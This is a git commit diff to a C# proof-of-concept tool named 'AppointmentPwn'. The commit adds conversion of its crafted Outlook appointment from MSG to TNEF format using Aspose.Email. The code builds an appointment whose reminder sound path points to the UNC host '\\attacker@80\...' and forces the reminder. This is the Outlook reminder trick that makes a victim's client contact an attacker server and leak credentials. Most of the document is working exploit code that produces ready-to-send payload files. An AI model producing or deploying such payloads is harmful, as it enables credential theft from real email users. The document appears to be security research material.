1aad4ef2cecc5b2371652db1d5f1f24f09a30df7
TÓTH István <iistvan.toth@gmail.com>
2023-03-22 11:24:32 +0100

    add MSG->TNEF conversion using Aspose.Email evaluation version

--- AppointmentPwn/Program.cs
+++ AppointmentPwn/Program.cs
@@ -1,4 +1,7 @@
-﻿using MsgKit;
+﻿using Aspose.Email;
+using Aspose.Email.Mapi;
+using Aspose.Email.Tools.Logging;
+using MsgKit;
 using MsgKit.Enums;
 using System;
 
@@ -6,8 +9,15 @@ namespace AppointmentPwn
 {
     internal class Program
     {
+        static void Log(string msg)
+        {
+            Console.Write(msg);
+        }
         static void Main()
         {
+            string outfilebase = @"outlook-pwn";
+            Log("[*] Using output base filename `" + outfilebase + "`\n");
+            Log("[+] Building malicious Appointment...");
             using (var appointment = new Appointment(
                 new Sender("istvan.toth@company.net", "Istvan Toth"),
                 new Representing("istvan.toth@company.net", "Istvan Toth"),
@@ -25,10 +35,26 @@ namespace AppointmentPwn
                 appointment.IconIndex = MessageIconIndex.UnsentMail;
                 appointment.PidLidReminderFileParameter = @"\\attacker@80\file\not\exists\sound.wav";
                 appointment.PidLidReminderOverride = true;
+                Log("DONE.\n");
+                Log("[+] Saving malicious Appointment as MSG file: " + outfilebase + ".msg...");
                 appointment.Save(@"outlook-pwn.msg");
+                Log("DONE.\n");
 
                 // Show the appointment
                 // System.Diagnostics.Process.Start(@"outlook-pwn.msg");
+
+                Log("[+] Converting MSG to TNEF...");
+                MapiMessage mapiMsg = MapiMessage.Load(outfilebase + ".msg");
+                MailConversionOptions mco = new MailConversionOptions
+                {
+                    ConvertAsTnef = true
+                };
+                MailMessage message = mapiMsg.ToMailMessage(mco);
+                Log("DONE.\n");
+                Log("[+] Saving TNEF message as " + outfilebase + ".tnef...");
+                message.Save(outfilebase + ".tnef");
+                Log("DONE.\n");
+
             }
         }
     }
